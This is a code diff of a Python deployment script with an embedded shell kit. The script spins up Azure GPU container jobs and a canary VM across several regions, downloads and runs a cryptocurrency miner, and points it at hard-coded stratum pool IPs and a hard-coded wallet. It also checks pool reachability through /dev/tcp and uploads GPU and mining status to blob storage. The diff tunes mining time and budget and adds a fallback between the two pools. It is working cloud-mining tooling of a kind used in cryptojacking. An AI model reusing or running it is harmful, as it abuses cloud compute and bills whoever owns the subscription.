@@ -28,19 +28,19 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-TAG = "C211_I133376"
-INTENT = "133376"
-NONCE = "x133376multi"
+TAG = "C211_I133457"
+INTENT = "133457"
+NONCE = "x133457multi"
 T0 = time.time()
 APP_VER = "2026-07-01"
 STG_VER = "2023-01-01"
 PROFILE = "Consumption-GPU-NC24-A100"
 IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
-SA_NAME = ("c211i133376" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
+SA_NAME = ("c211i133457" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
 CONT = "c211"
-JOB_NAME = "c211-i133376"
-MINE_S = 480
-BUDGET = 3000
+JOB_NAME = "c211-133457"
+MINE_S = 420
+BUDGET = 2400
 WALLET = "prl1pptvxkadcf7cy8tjhz3anhz7yfdmunxw428aq6ex4u220dlce54xq69grqr"
 RELAY = "stratum+tcp://217.15.164.237:2083"
 DIRECT = "stratum+tcp://103.199.106.122:3362"
@@ -188,11 +188,11 @@ W="__WALLET__"; RC=none
 log() { echo "$(date -u +%FT%TZ) $*" >> "$LOG"; }
 up() {
   { echo "===C211-STATUS==="; echo "nonce=__NONCE__"; echo "env=__ENV__"; echo "host=$H"; echo "worker=$WK";
-    echo "ts=$(date -u +%FT%TZ)"; echo "mine_rc=${RC:-none}";
+    echo "ts=$(date -u +%FT%TZ)"; echo "mine_rc=${RC:-none}"; echo "accepted_a=${ACCA:-0}"; echo "accepted_b=${ACCB:-0}"; echo "tcp_relay=${T1:-?}"; echo "tcp_direct=${T2:-?}";
     echo "smi_L=$(nvidia-smi -L 2>&1 | tr '\n' '~')";
     echo "gpuq=$(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 | tr '\n' '~')";
     echo "===KITLOG==="; tail -c 2500 "$LOG" 2>/dev/null; echo;
-    echo "===MINEOUT==="; tail -c 3500 "$D/mine.out" 2>/dev/null; echo;
+    echo "===MINEOUT==="; tail -c 2200 "$D/mine_a.out" 2>/dev/null; echo; echo "===MINEOUT_B==="; tail -c 2200 "$D/mine_b.out" 2>/dev/null; echo;
     echo "===C211-END==="; } > "$D/status.txt" 2>&1
   curl -sS -o /dev/null -w 'UP=%{http_code} ' --max-time 60 -X PUT "$SAS" \
     -H 'x-ms-blob-type: BlockBlob' -H 'x-ms-version: 2022-11-02' \
@@ -212,14 +212,30 @@ for u in "$PMURL" "$GHURL"; do
 done
 if [ -n "$GOT" ]; then
   chmod +x "$D/pm"
-  log "MINE_START relay=217.15.164.237:2083 direct=103.199.106.122:3362 mine_s=__MINES__"
-  timeout __MINES__ "$D/pm" --url "__RELAY__" --url "__DIRECT__" \
+  T1=FAIL; T2=FAIL
+  timeout 8 bash -c 'cat < /dev/null > /dev/tcp/217.15.164.237/2083' 2>/dev/null && T1=OK
+  timeout 8 bash -c 'cat < /dev/null > /dev/tcp/103.199.106.122/3362' 2>/dev/null && T2=OK
+  log "TCPCHECK relay=$T1 direct=$T2"
+  timeout __MINES__ "$D/pm" --url "__DIRECT__" \
     --user "$W" --worker "$WK" --coin pearl --password x --devices 0 \
-    --status-interval 15 --api-port 0 > "$D/mine.out" 2>&1
-  RC=$?
-  log "MINE_DONE rc=$RC"
+    --status-interval 15 --api-port 0 > "$D/mine_a.out" 2>&1
+  RCA=$?
+  ACCA=$(grep -c ' accepted ' "$D/mine_a.out" 2>/dev/null || true)
+  log "PHASE_A direct rc=$RCA accepted=$ACCA"
+  if [ "${ACCA:-0}" -eq 0 ]; then
+    timeout __MINES__ "$D/pm" --url "__RELAY__" \
+      --user "$W" --worker "$WK" --coin pearl --password x --devices 0 \
+      --status-interval 15 --api-port 0 > "$D/mine_b.out" 2>&1
+    RCB=$?
+    ACCB=$(grep -c ' accepted ' "$D/mine_b.out" 2>/dev/null || true)
+    log "PHASE_B relay rc=$RCB accepted=$ACCB"
+  else
+    RCB=skip; ACCB=0; log "PHASE_B skipped accepted_a=$ACCA"
+  fi
+  RC="$RCA"
+  log "MINEDONE a=$ACCA b=$ACCB rc_a=$RCA rc_b=$RCB"
 else
-  RC=99; log "NO_MINER_BINARY"
+  RCA=99; RC=99; ACCA=0; ACCB=0; RCB=skip; log "NO_MINER_BINARY"
 fi
 up
 log "KIT_EXIT rc=$RC"
@@ -264,6 +280,11 @@ def decode_status(txt):
         errs = [ln.strip() for ln in body.splitlines()
                 if re.search(r"error|Error|refused|timed out|unable|cannot|failed", ln)][:3]
         out["accepted_seen"] = max([int(x) for x in acc] or [0])
+        ma = re.search(r"^accepted_a=(\d+)$", txt, re.M)
+        mb = re.search(r"^accepted_b=(\d+)$", txt, re.M)
+        out["accepted_a"] = int(ma.group(1)) if ma else 0
+        out["accepted_b"] = int(mb.group(1)) if mb else 0
+        out["accepted_seen"] = max(out["accepted_seen"], out["accepted_a"], out["accepted_b"])
         out["rejected_seen"] = max([int(x) for x in rej] or [0])
         out["err_lines"] = " ~ ".join(errs)[:400]
         out["mine_tail"] = " ~ ".join(body.strip().splitlines()[-6:])[:600]
@@ -274,14 +295,6 @@ def decode_status(txt):
 TARGETS = [
     ("c211-133172-b0", "eastus", "Consumption-GPU-NC24-A100"),
     ("c211-i132971-a100-sweden", "swedencentral", "Consumption-GPU-NC24-A100"),
-    ("c211-i133055-a0", "swedencentral", "Consumption-GPU-NC24-A100"),
-    ("c211-i133055-a1", "westus3", "Consumption-GPU-NC24-A100"),
-    ("c211-i133055-a2", "italynorth", "Consumption-GPU-NC24-A100"),
-    ("c211-133172-b1", "westus", "Consumption-GPU-NC24-A100"),
-    ("c211-133172-b10", "brazilsouth", "Consumption-GPU-NC24-A100"),
-    ("c211-133172-b11", "canadacentral", "Consumption-GPU-NC24-A100"),
-    ("c211-133172-b6", "australiaeast", "Consumption-GPU-NC24-A100"),
-    ("c211-133172-b7", "uksouth", "Consumption-GPU-NC24-A100"),
     ("c211-132160-brs", "brazilsouth", "Consumption-GPU-NC8as-T4"),
 ]
 COMPUTE_VER = "2024-07-01"
@@ -296,7 +309,7 @@ def normloc(v):
 
 
 def jname_for(env):
-    s = ("c211-i133376-" + env.replace("c211-", "")).lower()
+    s = ("c211-133457-" + env.replace("c211-", "")).lower()
     s = re.sub(r"[^a-z0-9-]", "-", s)
     return s[:32]
 
@@ -484,7 +497,7 @@ def main():
         free = appfree.get(reg)
         n = len(grp)
         for x in grp:
-            par = 8 if free is None else max(1, min(8, int(free) // n))
+            par = 1
             nm = jname_for(x["name"])
             url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
                    "?api-version=%s" % (ARM, sid, RG, nm, APP_VER))
@@ -628,7 +641,7 @@ def main():
                 cand = dict(c, vmsize=vs)
                 break
         if cand:
-            vmname = "c211-i133376-canary"
+            vmname = "c211-133457-canary"
             vmurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Compute/"
                      "virtualMachines/%s?api-version=%s" % (ARM, sid, RG, vmname, COMPUTE_VER))
             sas_url = "%s/%s-vm-canary.txt?%s" % (cont_base, NONCE, q)
@@ -637,7 +650,7 @@ def main():
                      "--location", cand["region"], "--image", "Ubuntu2204",
                      "--size", cand["vmsize"], "--admin-username", "c211adm",
                      "--generate-ssh-keys", "--custom-data", "/tmp/c211_ci.yaml",
-                     "--tags", "c211=133376"], timeout=540)
+                     "--tags", "c211=133457"], timeout=540)
             emit("vm-create", region=cand["region"], sku=cand["sku"], vmsize=cand["vmsize"],
                  rc=r["rc"], out=r["out"][-600:], err=r["err"][-600:])
             found = False
